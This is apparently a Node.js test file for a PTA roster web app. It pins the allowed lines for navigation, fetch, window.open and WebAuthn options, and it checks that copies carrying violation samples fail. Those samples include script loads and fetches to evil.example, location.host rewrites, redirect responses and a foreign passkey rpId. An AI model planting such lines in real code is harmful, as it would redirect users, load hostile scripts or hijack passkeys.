	const opens = scan(codeFiles, match.open);
	assert.deepEqual([...new Set(opens)], ['js/district.js window.open(', 'js/rep.js window.open(', 'sw.js caches.open('], 'open( is used only by window.open of the shares and caches.open');
	assert.equal(opens.filter(found => found === 'sw.js caches.open(').length, 2);
	const windowOpens = codeFiles.flatMap(file => read(file).split('\n').filter(line => /\bwindow\.open\(/.test(line) && !/typeof window\.open/.test(line)).map(line => `${file} ${line.trim()}`));
	assert.equal(windowOpens.length, 6, 'The LINE and mail shares of district.js and rep.js');
	for (const call of windowOpens) assert.match(call, /'_blank', 'noopener,noreferrer'\);$/, `A new window opens with noopener,noreferrer: ${call}`);
	assert.deepEqual(scan(codeFiles, match.locationOperation), [
		'js/app.js location.href=',
		'js/app.js location.reload(',
		'js/app.js location.replace(',
		'js/rep.js location.href='
	], 'location is only replaced or assigned by the update, the mail share and the reload after clearing');
	assert.deepEqual(scan(codeFiles, match.locationItself), [
		"js/handoff.js function buildExternalBrowserUrl(location = window.location, mode = 'district') {",
		"js/hata.js const location = c.location ?? '〇〇交差点・小学校正門前';"
	], 'location itself is never assigned; only these two local names use the word');
	assert.deepEqual(scan(codeFiles, match.navigationApi), [], 'No other navigation or form submission');
});

test('R-25 / I-14-02: the name allowlist detects rewritten and moved lines', () => {
	const allowed = scan(codeFiles, nameOccurrences('href'));
	const withText = (file, text) => codeFiles.flatMap(name => nameOccurrences('href')(name === file ? text : read(name)).map(found => `${name} ${found}`)).sort();
	const handoff = read('js/handoff.js');
	assert.notDeepEqual(withText('js/handoff.js', handoff.replace('link.href = url;', 'link.href = importedModel.homepage;')), allowed, 'Rewriting an allowlisted line with the same count is detected');
	const utils = read('js/utils.js');
	assert.notDeepEqual(withText('js/utils.js', utils.replace('a.href = url;', 'a.href = currentDistrict.contactUrl;')), allowed);
	const moved = codeFiles.flatMap(name => nameOccurrences('href')(name === 'js/utils.js' ? utils.replace('a.href = url;', '') : name === 'js/seat.js' ? read(name) + '\na.href = url;' : read(name)).map(found => `${name} ${found}`)).sort();
	assert.notDeepEqual(moved, allowed, 'Moving an allowlisted line to another file is detected');
	assert.deepEqual(withText('js/utils.js', utils), allowed, 'The unchanged files match');
});

test('R-25 / I-14-02: sensitive names occur only at the allowlisted lines, whatever the syntax', () => {
	const occurrences = (files, name) => scan(files, nameOccurrences(name));
	assert.deepEqual(occurrences(codeFiles, 'href'), [
		'js/app.js window.location.href = newUrl;',
		'js/handoff.js const url = new URL(location.href);',
		'js/handoff.js link.href = url;',
		'js/handoff.js return url.href;',
		'js/rep.js window.location.href = mailUrl;',
		'js/utils.js a.href = url;',
		'sw.js ASSET_URLS.has(url.href) && request.credentials !== \'include\' &&',
		'sw.js const ASSET_URLS = new Set(ASSETS.map(asset => new URL(asset, CACHE_SCOPE).href));',
		'sw.js if (sourceUrl.origin !== SCOPE_ORIGIN || (sourceUrl.href !== CACHE_SCOPE && !sourceUrl.href.startsWith(SCOPE_PREFIX))) return;',
		'sw.js if (sourceUrl.origin !== SCOPE_ORIGIN || (sourceUrl.href !== CACHE_SCOPE && !sourceUrl.href.startsWith(SCOPE_PREFIX))) return;'
	], 'href occurs only for the update, the shares, the external-browser link, the file save and URL reads');
	// open は、共有の window.open・その有無の確認・ダイアログとクラス名の open・caches.open の行の内容で固定する（移動先の書換え・別ファイルへの移動を検出する）。
	assert.deepEqual(occurrences(codeFiles, 'open'), [
		"js/district.js window.open('https://line.me/R/msg/text/?' + encodeURIComponent(content), '_blank', 'noopener,noreferrer');",
		"js/district.js window.open('https://line.me/R/msg/text/?' + encodeURIComponent(lineGuidance), '_blank', 'noopener,noreferrer');",
		"js/district.js window.open('mailto:?subject=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(content), '_blank', 'noopener,noreferrer');",
		"js/district.js window.open('mailto:?subject=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(emailGuidance), '_blank', 'noopener,noreferrer');",
		"js/handoff.js if (dialog.open) dialog.close();",
		"js/handoff.js if (epoch !== handoffEpoch || !document.getElementById('browser-handoff-dialog').open) throw new Error('引き継ぎ画面が閉じられました。');",
		"js/hata.js content.classList.add('open');",
		"js/hata.js content.classList.remove('open');",
		"js/hata.js if (content.classList.contains('open')) {",
		"js/rep.js if (typeof window !== 'undefined' && typeof window.open === 'function') {",
		"js/rep.js window.open(lineUrl, '_blank', 'noopener,noreferrer');",
		"js/rep.js window.open(mailUrl, '_blank', 'noopener,noreferrer');",
		"js/rep.js } else if (typeof window.open === 'function') {",
		"sw.js caches.open(CACHE_NAME).then(async cache => {",
		"sw.js const cache = await caches.open(CACHE_NAME);"
	], 'open occurs only at the allowlisted lines');
	// 許可した移動先へ渡す URL を作る行と、fetch の出現も、行の内容で固定する。
	assert.deepEqual(occurrences(codeFiles, 'newUrl'), [
		"js/app.js const newUrl = (origin && pathname) ? `${origin}${pathname}?mode=${mode}` : `?mode=${mode}`;",
		"js/app.js const newUrl = origin + pathname + '?_update=' + Date.now();",
		"js/app.js window.history.replaceState({ mode }, '', newUrl);",
		"js/app.js window.location.href = newUrl;",
		"js/app.js window.location.replace(newUrl);"
	]);
	assert.deepEqual(occurrences(codeFiles, 'lineUrl'), [
		"js/rep.js const lineUrl = 'https://line.me/R/msg/text/?' + encodeURIComponent(lineBody);",
		"js/rep.js window.open(lineUrl, '_blank', 'noopener,noreferrer');"
	]);
	assert.deepEqual(occurrences(codeFiles, 'mailUrl'), [
		"js/rep.js const mailUrl = 'mailto:?subject=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(mailBody);",
		"js/rep.js window.location.href = mailUrl;",
		"js/rep.js window.open(mailUrl, '_blank', 'noopener,noreferrer');"
	]);
	// WebAuthn の選択肢を変数で組み立てて渡す形も検出するよう、credentials と publicKey の出現を固定する。
	assert.deepEqual(occurrences(codeFiles, 'credentials'), [
		"js/app.js const res = await fetch('./version.json?_t=' + Date.now(), { cache: 'no-store', credentials: 'omit', signal: controller.signal });",
		"js/crypto.js const assertion = await navigator.credentials.get(getOptions);",
		"js/crypto.js const assertion = await navigator.credentials.get(getOptions);",
		"js/crypto.js const credential = await navigator.credentials.create(createOptions);",
		"js/crypto.js typeof navigator.credentials !== 'undefined' &&",
		"sw.js ASSET_URLS.has(url.href) && request.credentials !== 'include' &&",
		"sw.js const assetRequest = publicNavigationRequest(event.request) || new Request(event.request, { credentials: 'omit' });",
		"sw.js const request = new Request(url, { credentials: 'omit', cache: 'no-store' });",
		"sw.js const response = await fetch(request, { credentials: 'omit', cache: 'no-store' });",
		"sw.js event.respondWith(fetch(event.request, { cache: 'no-store', credentials: 'omit' }));",
		"sw.js return new Request(new URL('index.html', CACHE_SCOPE), { credentials: 'omit', cache: 'no-store' });"
	]);
	assert.deepEqual(occurrences(codeFiles, 'publicKey'), [
		"js/crypto.js publicKey: {",
		"js/crypto.js publicKey: {",
		"js/crypto.js publicKey: {"
	]);
	assert.deepEqual(occurrences(codeFiles, 'fetch'), [
		"js/app.js const res = await fetch('./version.json?_t=' + Date.now(), { cache: 'no-store', credentials: 'omit', signal: controller.signal });",
		"sw.js const response = await fetch(request);",
		"sw.js const response = await fetch(request, { credentials: 'omit', cache: 'no-store' });",
		"sw.js event.respondWith(fetch(event.request, { cache: 'no-store', credentials: 'omit' }));",
		"sw.js self.addEventListener('fetch', event => {"
	]);
	// ファイルの保存と LINE 内ブラウザ向けのリンクの URL を作る関数は、本体の全行を固定する。
	assert.deepEqual(functionBody(read('js/utils.js'), 'downloadTextFile'), [
		'function downloadTextFile(content, filename) {',
		'const blob = new Blob([content], { type: "text/plain;charset=utf-8" });',
		"const a = document.createElement('a');",
		'const url = URL.createObjectURL(blob);',
		'a.href = url;',
		'a.download = filename;',
		'a.click();',
		'const t = setTimeout(() => URL.revokeObjectURL(url), 1000);',
		"if (t && typeof t.unref === 'function') t.unref();",
		'}'
	]);
	assert.deepEqual(functionBody(read('js/handoff.js'), 'buildExternalBrowserUrl'), [
		"function buildExternalBrowserUrl(location = window.location, mode = 'district') {",
		'const url = new URL(location.href);',
		"if (!['https:', 'http:'].includes(url.protocol)) return '';",
		"url.username = ''; url.password = ''; url.search = ''; url.hash = '';",
		"url.searchParams.set('mode', ['district', 'rep', 'neighbor', 'transfer'].includes(mode) ? mode : 'district');",
		"url.searchParams.set('openExternalBrowser', '1');",
		'return url.href;',
		'}'
	]);
	assert.deepEqual(occurrences(codeFiles, 'navigate'), ["sw.js if (request.mode !== 'navigate' || url.origin !== SCOPE_ORIGIN ||"]);
	for (const name of ['openWindow', 'rel', 'ping', 'http-equiv', 'httpEquiv', 'opener', 'parent', 'rpId', 'largeBlob', 'credBlob']) assert.deepEqual(occurrences(codeFiles, name), [], `${name} does not occur`);
	for (const name of ['add', 'addAll', 'redirect', 'Refresh']) assert.deepEqual(occurrences(['sw.js'], name), [], `sw.js does not use ${name}`);
	assert.equal(occurrences(['sw.js'], 'put').length, 2);
	assert.deepEqual(occurrences(['sw.js'], 'clients'), ['sw.js }).then(() => self.clients.claim())']);
	// location は、実際の Location を受け取る引数と旗振りの場所の項目名を含めて、行の内容で固定する（別名・引数で受け渡す箇所の追加も検出する）。
	assert.deepEqual(occurrences(codeFiles, 'location'), [
		"js/app.js const origin = (typeof window !== 'undefined' && window.location.origin) ? window.location.origin : '';",
		"js/app.js const origin = (typeof window !== 'undefined' && window.location.origin) ? window.location.origin : '';",
		"js/app.js const origin = window.location.origin || '';",
		"js/app.js const origin = window.location.origin || '';",
		"js/app.js const params = new URLSearchParams(window.location.search);",
		"js/app.js const pathname = (typeof window !== 'undefined' && window.location.pathname) ? window.location.pathname : '';",
		"js/app.js const pathname = (typeof window !== 'undefined' && window.location.pathname) ? window.location.pathname : '';",
		"js/app.js const pathname = window.location.pathname || '';",
		"js/app.js const pathname = window.location.pathname || '';",
		"js/app.js const pathname = window.location.pathname || '/';",
		"js/app.js const secure = window.location.protocol === 'https:' || (window.location.protocol === 'http:' && ['localhost', '127.0.0.1'].includes(window.location.hostname));",
		"js/app.js const secure = window.location.protocol === 'https:' || (window.location.protocol === 'http:' && ['localhost', '127.0.0.1'].includes(window.location.hostname));",
		"js/app.js const secure = window.location.protocol === 'https:' || (window.location.protocol === 'http:' && ['localhost', '127.0.0.1'].includes(window.location.hostname));",
		"js/app.js if (typeof navigator !== 'undefined' && 'serviceWorker' in navigator && (window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')) {",
		"js/app.js if (typeof navigator !== 'undefined' && 'serviceWorker' in navigator && (window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')) {",
		"js/app.js if (typeof navigator !== 'undefined' && 'serviceWorker' in navigator && (window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')) {",
		"js/app.js if (typeof window !== 'undefined' && window.location && window.location.search) {",
		"js/app.js if (typeof window !== 'undefined' && window.location && window.location.search) {",
		"js/app.js if (typeof window !== 'undefined' && window.location) {",
		"js/app.js if (typeof window !== 'undefined' && window.location) {",
		"js/app.js if (typeof window.location.replace === 'function') {",
		"js/app.js if (window.location.origin) appScope = window.location.origin + basePath;",
		"js/app.js if (window.location.origin) appScope = window.location.origin + basePath;",
		"js/app.js location.reload();",
		"js/app.js window.location.href = newUrl;",
		"js/app.js window.location.replace(newUrl);",
		"js/crypto.js if (['district', 'location', 'contactMsg', 'specials', 'metaLocation', 'metaContactMsg', 'metaCreatedDate', 'scheduleCreatedDate'].some(k => String(h[k] || '').trim() !== '')) return true;",
		"js/crypto.js window.location.protocol !== 'file:';",
		"js/district.js location: currentDistrict.hata.location || \"\",",
		"js/district.js location: currentDistrict.hata.location || \"\",",
		"js/events.js const UI_HATA_FIELDS = ['title', 'location', 'time', 'startDate', 'endDate', 'orientation',",
		"js/handoff.js const url = buildExternalBrowserUrl(window.location, mode);",
		"js/handoff.js const url = new URL(location.href);",
		"js/handoff.js function buildExternalBrowserUrl(location = window.location, mode = 'district') {",
		"js/handoff.js function buildExternalBrowserUrl(location = window.location, mode = 'district') {",
		"js/hata.js <td style=\"width: 32%;\">${esc(location)}</td>",
		"js/hata.js const location = c.location ?? '〇〇交差点・小学校正門前';",
		"js/hata.js const location = c.location ?? '〇〇交差点・小学校正門前';",
		"js/hata.js let text = `【${c.title ?? ''}】\\n地区: ${c.district ?? currentDistrict.district ?? ''}\\n場所: ${c.location ?? ''}\\n時間: ${c.time ?? ''}\\n`;",
		"js/hata.js location: '',",
		"js/hata.js location: parsed.location ?? parsed.metaLocation ?? '',",
		"js/hata.js location: parsed.location ?? parsed.metaLocation ?? '',",
		"js/rep.js if (window.location) {",
		"js/rep.js window.location.href = mailUrl;",
		"js/state.js location: \"\",",
		"js/utils.js ['metaLocation', 'location'], ['metaTime', 'time'], ['metaHeaderMsg', 'headerMsg'],",
		"js/utils.js const strings = ['scheduleTitle', 'title', 'metaCreatedDate', 'createdDate', 'scheduleCreatedDate', 'district', 'metaLocation', 'location', 'metaTime', 'time', 'metaHeaderMsg', 'headerMsg', 'metaFooterMsg', 'footerMsg', 'metaContactMsg', 'contactMsg', 'startDate', 'endDate', 'specials', 'format'];",
		"js/utils.js location: 'hata-location', time: 'hata-time', headerMsg: 'hata-header-msg',"
	], 'location occurs only at the allowlisted lines');
	assert.deepEqual(occurrences(codeFiles, 'hostname'), [
		"js/app.js const secure = window.location.protocol === 'https:' || (window.location.protocol === 'http:' && ['localhost', '127.0.0.1'].includes(window.location.hostname));",
		"js/app.js if (typeof navigator !== 'undefined' && 'serviceWorker' in navigator && (window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')) {",
		"js/app.js if (typeof navigator !== 'undefined' && 'serviceWorker' in navigator && (window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')) {"
	]);
	assert.deepEqual(occurrences(codeFiles, 'protocol'), [
		"js/app.js const secure = window.location.protocol === 'https:' || (window.location.protocol === 'http:' && ['localhost', '127.0.0.1'].includes(window.location.hostname));",
		"js/app.js const secure = window.location.protocol === 'https:' || (window.location.protocol === 'http:' && ['localhost', '127.0.0.1'].includes(window.location.hostname));",
		"js/app.js if (typeof navigator !== 'undefined' && 'serviceWorker' in navigator && (window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')) {",
		"js/crypto.js window.location.protocol !== 'file:';",
		"js/handoff.js if (!['https:', 'http:'].includes(url.protocol)) return '';"
	]);
	for (const name of ['host', 'port']) assert.deepEqual(occurrences(codeFiles, name), [], `${name} does not occur`);
	// URL のホスト・スキームへの代入（Object.assign などのキーを含む）はない。
	assert.deepEqual(scan(codeFiles, match.urlPartAssignment), [], 'No host, hostname, protocol or port is assigned');
});

/** 関数の宣言から対応する閉じ括弧までの各行（前後の空白を除く）。 */
function functionBody(text, name) {
	const start = text.indexOf(`function ${name}(`);
	if (start < 0) return [];
	let depth = 0;
	let end = text.indexOf('{', start);
	for (; end < text.length; end++) {
		if (text[end] === '{') depth++;
		else if (text[end] === '}' && --depth === 0) break;
	}
	return text.slice(start, end + 1).split('\n').map(line => line.trim()).filter(Boolean);
}

/** WebAuthn の publicKey の選択肢の塊（括弧の対応で切り出し、各行の前後の空白を除く）。 */
function publicKeyBlocks(text) {
	const blocks = [];
	for (const found of text.matchAll(/publicKey:\s*\{/g)) {
		let depth = 0;
		let end = found.index + found[0].length - 1;
		for (; end < text.length; end++) {
			if (text[end] === '{') depth++;
			else if (text[end] === '}' && --depth === 0) break;
		}
		blocks.push(text.slice(found.index, end + 1).split('\n').map(line => line.trim()).filter(Boolean).join('\n'));
	}
	return blocks;
}

test('R-25 / E-14-05 / I-14-02: WebAuthn passes only the fixed relying party, user and PRF salt', () => {
	const PRF = ['extensions: {', 'prf: {', 'eval: {', 'first: prfSalt', '}', '}', '}'];
	const expected = [
		['publicKey: {', 'challenge,', 'rp: { name: "kogaidocs - 校外委員名簿管理システム" },', 'user: {', 'id: WEBAUTHN_USER_ID,', 'name: "kogaidocs-user",', 'displayName: "PTA校外委員会 名簿管理"', '},', 'pubKeyCredParams: [', '{ type: "public-key", alg: -7 },', '{ type: "public-key", alg: -257 }', '],', 'authenticatorSelection: {', 'authenticatorAttachment: "platform",', 'userVerification: "required",', 'residentKey: "preferred"', '},', 'timeout: 60000,', ...PRF, '}'],
		['publicKey: {', 'challenge: crypto.getRandomValues(new Uint8Array(32)),', 'allowCredentials: [{', 'id: credential.rawId,', 'type: "public-key"', '}],', 'userVerification: "required",', 'timeout: 60000,', ...PRF, '}'],
		['publicKey: {', 'challenge: crypto.getRandomValues(new Uint8Array(32)),', 'allowCredentials: [{', 'id: credId,', 'type: "public-key"', '}],', 'userVerification: "required",', 'timeout: 60000,', ...PRF, '}']
	];
	const blocks = publicKeyBlocks(read('js/crypto.js'));
	assert.equal(blocks.length, 3, 'create and the two get calls');
	assert.equal(blocks[0], expected[0].join('\n'), 'The registration options are fixed');
	assert.equal(blocks[1], expected[1].join('\n'), 'The PRF fallback options are fixed');
	assert.equal(blocks[2], expected[2].join('\n'), 'The unlock options are fixed');
	assert.deepEqual(occurrencesOf(['js/crypto.js'], 'WEBAUTHN_USER_ID').filter(line => /^js\/crypto\.js const /.test(line)), ['js/crypto.js const WEBAUTHN_USER_ID = new Uint8Array([107, 111, 103, 97, 105, 100, 111, 99, 115]);']);
	// 試料: 複数行の user の表示名の書換えと、extensions への largeBlob の追加は、塊の固定で検出される。
	const original = read('js/crypto.js');
	assert.notEqual(publicKeyBlocks(original.replace('displayName: "PTA校外委員会 名簿管理"', 'displayName: currentDistrict.district'))[0], expected[0].join('\n'));
	const withLargeBlob = original.replace(/first: prfSalt\n(\t+)\}/, 'first: prfSalt\n$1},\n$1largeBlob: { write: data }');
	assert.notEqual(withLargeBlob, original, 'The sample was applied');
	assert.notEqual(publicKeyBlocks(withLargeBlob)[0], expected[0].join('\n'));
	assert.notDeepEqual(nameOccurrences('largeBlob')(withLargeBlob), [], 'largeBlob is reported by the zero-occurrence names');
});

test('R-25 / I-14-02: scripts build no link, meta, form, frame or script markup', () => {
	assert.deepEqual(scan(jsFiles, match.htmlTag), [], 'No such tag in HTML strings');
	assert.deepEqual(scan(jsFiles, match.htmlAttribute), [], 'No such attribute in HTML strings');
	assert.deepEqual(scan(jsFiles, match.createElement), ["js/utils.js createElement('a'"], 'Only the file save creates a link');
});

test('R-25 / I-14-02: links are set only for the file save and the external-browser link, and no hint attribute is touched', () => {
	assert.deepEqual(scan(codeFiles, match.hrefAssignment), [
		'js/app.js window.location.href = newUrl;',
		'js/handoff.js link.href = url;',
		'js/rep.js window.location.href = mailUrl;',
		'js/utils.js a.href = url;'
	], 'href is assigned only by the update fallback, the mail share, the external-browser link and the file save');
	assert.deepEqual(scan(codeFiles, match.linkAttribute), [], 'No link, hint or form target attribute is set');
	const rels = [...read('index.html').matchAll(/\brel\s*=\s*"([^"]*)"/gi)].map(found => found[1]);
	assert.deepEqual([...new Set(rels)].sort(), ['apple-touch-icon', 'icon', 'manifest', 'noopener noreferrer', 'stylesheet']);
	assert.deepEqual(scan(appFiles, match.resourceHint), [], 'No resource hint is declared or created');
});

test('R-25 / E-14-03 / I-14-02: spell checking and writing suggestions are disabled for the whole page and never re-enabled', () => {
	const body = read('index.html').match(/<body\b[^>]*>/)[0];
	assert.match(body, /\sspellcheck="false"/);
	assert.match(body, /\swritingsuggestions="false"/);
	assert.deepEqual(scan(['index.html', ...jsFiles], match.inputAssistEnabled), [], 'No element re-enables spell checking or writing suggestions');
});

/** I-14-03: 配信するファイルを一時ディレクトリへ写し、変更を加えて、この静的試験を子プロセスで実行する。 */
function runStaticChecksOn(mutate, extraFiles = {}) {
	const dir = fs.mkdtempSync(path.join(require('node:os').tmpdir(), 'kogai-csp-static-'));
	try {
		copyServedFiles(dir);
		for (const [file, text] of Object.entries(extraFiles)) {
			fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
			fs.writeFileSync(path.join(dir, file), text);
		}
		if (mutate) {
			const [file, change] = mutate;
			const before = fs.readFileSync(path.join(dir, file), 'utf8');
			const after = change(before);
			assert.notEqual(after, before, `The sample changes ${file}`);
			fs.writeFileSync(path.join(dir, file), after);
		}
		// 親の試験ランナーの子として振る舞わないよう NODE_TEST_CONTEXT を、カバレッジの集計に混ざらないよう NODE_V8_COVERAGE を引き継がない。
		const { NODE_TEST_CONTEXT, NODE_V8_COVERAGE, ...env } = process.env;
		const child = require('node:child_process').spawnSync(process.execPath, ['--test', '--test-reporter=tap', __filename], { env: { ...env, KOGAI_CSP_ROOT: dir }, encoding: 'utf8' });
		return { status: child.status, failed: [...child.stdout.matchAll(/^not ok \d+ - (.*)$/gm)].map(found => found[1]) };
	} finally {
		fs.rmSync(dir, { recursive: true, force: true });
	}
}

test('R-25 / I-14-03: the static checks fail on copies that carry each documented violation sample', { skip: !!process.env.KOGAI_CSP_ROOT }, () => {
	const control = runStaticChecksOn(null);
	assert.deepEqual(control, { status: 0, failed: [] }, 'Control: an unchanged copy passes');
	// 手元のファイルは、違反の字句を含んでいても走査しない（走査の一覧が範囲の判定と同じ一覧から作られる）。
	const local = runStaticChecksOn(null, { 'js/.x.js': "fetch('https://evil.example/');", 'js/app.js~': "location.host = 'evil.example';", '.vscode/help.html': '<script src="https://evil.example/x.js"></script>' });
	assert.deepEqual(local, { status: 0, failed: [] }, 'A copy with local files that contain violations still passes');
	const append = code => text => text + '\n' + code + '\n';
	const samples = [
		['js/app.js', append('const loc = window.location;')],
		['sw.js', append('function redirectTo(u) { return Response.redirect(u, 302); }')],
		['sw.js', append('function redirectWithHeader(u) { return new Response(null, { status: 302, headers: { Location: u } }); }')],
		['sw.js', append("function refreshTo(u) { return new Response('', { headers: { Refresh: '0;url=' + u } }); }")],
		['sw.js', append('function addOne(cache, url) { return cache.add(url); }')],
		['sw.js', append('function addMany(cache, url) { return cache.addAll([url]); }')],
		['js/crypto.js', text => text.replace('rp: { name: "kogaidocs - 校外委員名簿管理システム" },', 'rp: { id: \'example.com\', name: "kogaidocs - 校外委員名簿管理システム" },')],
		['js/crypto.js', text => text.replace('name: "kogaidocs-user",', 'name: currentDistrict.district,')],
		['js/crypto.js', text => text.replace('allowCredentials: [{\n\t\t\t\tid: credId,', "rpId: 'example.com',\n\t\t\tallowCredentials: [{\n\t\t\t\tid: credId,")],
		['js/crypto.js', text => text.replace('new Uint8Array([107, 111, 103, 97, 105, 100, 111, 99, 115])', 'new TextEncoder().encode(currentDistrict.district)')],
		['js/crypto.js', append("async function syncPasskey() { const options = { challenge: new Uint8Array(32), rp: { id: 'kogai-sync.example', name: 'x' }, user: { id: new Uint8Array(1), name: currentDistrict.district, displayName: 'x' }, pubKeyCredParams: [] }; return navigator.credentials.create({ publicKey: options }); }")],
		['js/handoff.js', text => text.replace("\tconst url = new URL(location.href);", "\tconst url = new URL(location.href);\n\tlocation.replace(url.href);")],
		['js/handoff.js', text => text.replace("\tconst url = new URL(location.href);", "\tconst url = new URL(location.href);\n\tlocation.host = 'mirror.example.net';")],
		['js/app.js', append("function translateNames() { return Translator.create({ sourceLanguage: 'ja', targetLanguage: 'en' }); }")],
		['index.html', text => text.replace('</body>', '<img srcset="icons/icon-192.png 1x, //nasbox/b.png 2x" alt="">\n</body>')]
	];
	for (const [file, change] of samples) {
		const result = runStaticChecksOn([file, change]);
		assert.notEqual(result.status, 0, `A copy with the sample in ${file} fails: ${change.toString().slice(0, 160)}`);
		assert.ok(result.failed.length > 0, `The failing checks are reported for ${file}`);
	}
});
